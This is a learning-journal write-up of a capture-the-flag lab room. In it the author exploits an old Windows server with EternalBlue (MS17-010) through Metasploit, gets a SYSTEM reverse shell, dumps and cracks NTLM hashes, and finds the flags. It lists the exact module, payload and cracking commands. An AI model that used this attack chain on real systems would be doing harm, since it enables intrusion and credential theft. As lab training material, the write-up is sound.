# Blue — Windows, EternalBlue (MS17-010)

| | |
|---|---|
| Date | 2026-09-12 |
| Time | 1h35 |
| Outcome | admin — `NT AUTHORITY\SYSTEM` |
| Confidence | 2/5 (first Windows machine) |
| Path | nmap → NSE vuln scripts → MS17-010 → Metasploit EternalBlue → shell → meterpreter → hashdump → john (NTLM) → flags |

First Windows machine. The methodology transferred intact — recon, assessment, exploit,
post-exploitation — only the vocabulary changed.

## The chain

1. **Recon:** `nmap -sV` → all services Microsoft: 135/49xxx RPC, 139/445 SMB,
   3389 RDP, 5985 WinRM. OS fingerprint: Windows Server 2008 R2–2012 era — old.
   Attack surface = 445 (SMB), 3389, 5985; the 49xxx RPC ports are normal noise.
2. **Vuln assessment:** `nmap -p 445 --script smb-vuln-*` →
   `smb-vuln-ms17-010: VULNERABLE — CVE-2017-0143, Remote Code Execution in SMBv1`.
   The nmap scripting engine names the CVE; old Windows + SMBv1 is the most exploited
   combination in Windows history (WannaCry's engine).
3. **Exploit:** Metasploit: `search ms17-010` → `exploit/windows/smb/ms17_010_eternalblue`
   (rank: *average* — a kernel pool-corruption exploit that can crash the target).
   `set RHOSTS <target>` (R = remote = target), `set LHOST <tun0>` (L = local = attacker),
   payload `windows/x64/shell/reverse_tcp`, `exploit` → `Command shell session 1 opened`,
   `whoami` → `nt authority\system`. Kernel exploit ⇒ SYSTEM directly; no privesc phase.
4. **Upgrade to meterpreter:** `post/multi/manage/shell_to_meterpreter` with `SESSION 1`.
   Needed a **persistent handler** (`exploit/multi/handler`, `run -j`, port 4445) with
   `set HANDLER false` — the module's own temporary handler tears itself down before a slow
   callback lands. The upgraded session arrived **asynchronously**, seconds after the module
   printed "execution completed": `Meterpreter session 2 opened`.
5. **Loot:** `hashdump` → LM + NT hashes per account. `john --format=NT -w=rockyou hash.txt`
   → `alqfna22 (Jon)` in under a second.
6. **Flags:** meterpreter `search -f flag*.txt` (Windows equivalent of `find`):
   - `C:\flag1.txt` — drive root
   - `C:\Windows\System32\config\flag2.txt` — the SAM/SYSTEM hive directory, i.e. the
     credential database `hashdump` reads
   - flag3 inside `C:\Users\Jon\AppData\` — Windows' per-user application-data tree
     (the rough cousin of Linux dotfiles); that location is the room's final question.

## Windows vocabulary bank (first contact)

- **R = Remote = target. L = Local = you.** RHOSTS/RPORT vs LHOST/LPORT.
- **Exploit = how you get in. Payload = what runs once you're inside**
  (`windows/x64/meterpreter/reverse_tcp`). A module path is not a payload.
- Module taxonomy: `exploit/` (entry), `auxiliary/` (scanners/helpers), `post/` (after access).
- Module ranks: *average* means "works, may crash the box" → expect a reboot-retry loop.
- **The prompt is the map:** `C:\>` = cmd.exe (Windows commands: `tasklist`, `whoami`);
  `meterpreter >` = framework (its own commands: `ps`, `sysinfo`, `hashdump`, `search`,
  `download`, `cd`, `cat`).
- **NT AUTHORITY\SYSTEM = root** on Windows.
- LM hash = crippled legacy half (disabled on modern boxes, stores the constant
  `aad3b435...` = "empty"). NT hash = NTLM (MD4 of the password) — the one to crack.
  When john auto-detects wrong, its warnings list the candidates: `--format=NT`.
- **THM reissues IPs on machine restart — and on your VPN reconnect.** Both ends move.
- meterpreter `cat`/`cd` choke on drive-letter absolute paths; walk in relative hops
  (`cd Windows` → `cd System32` → …) or `download` the file and read it locally.

## Misses and countermeasures

- **RHOST set to own IP / exploit name set as PAYLOAD** — Metasploit vocabulary was new.
  Countermeasure: `show options` before every `exploit`; R=remote, L=local.
- **"Exploit completed, but no session was created" misread as exploit failure** — the
  exploit fired; the callback didn't arrive (stale LHOST or crashed box). Countermeasure:
  parse the failure location (fire vs callback) before changing anything.
- **Upgrade declared dead ~10 seconds too early**; session killed, teardown started —
  meterpreter session 2 opened seconds later, visible in the same transcript.
  Countermeasure: async tools report success in the future tense — check, wait a minute,
  check again before pronouncing death.
- **Identical failing command re-run 2–3×** (`cat`/`cd` with absolute paths).
  Countermeasure: every retry changes one variable.
- **john ran without `--format`** → attacked the empty LM half, `0g`, "Session completed"
  read as success. Countermeasure: read the verdict line (`0g` = nothing cracked); when the
  tool warns it's unsure, the answer is in the candidate list.
- **Google before `search`** — msfconsole indexes its own modules (and `search` wants
  underscores: `shell_to_meterpreter`, not `shell-to-meterpreter`). Countermeasure: the tool
  you're holding knows its own contents; browser second.

## Wins

- Correct attack-surface read: one old SMB service mattered, the rest was noise.
- Let the NSE script name the CVE — scan, don't guess (Ignite's lesson, held).
- Drove the crash → reboot → new-IP → retry loop end to end.
- Recognized LM-vs-NT on the second attempt and cracked with the right format.
- Honest journal: mentor/AI use and external stress disclosed.

## Notes

- 1h35 on the first Windows box, with ~9 pings — nearly all new *tooling* (Metasploit,
  meterpreter), not new *methodology*. Expected cost of a new OS; the phase structure held.
- External stress flagged in journal — 15-minute cycles still apply on heavy days.
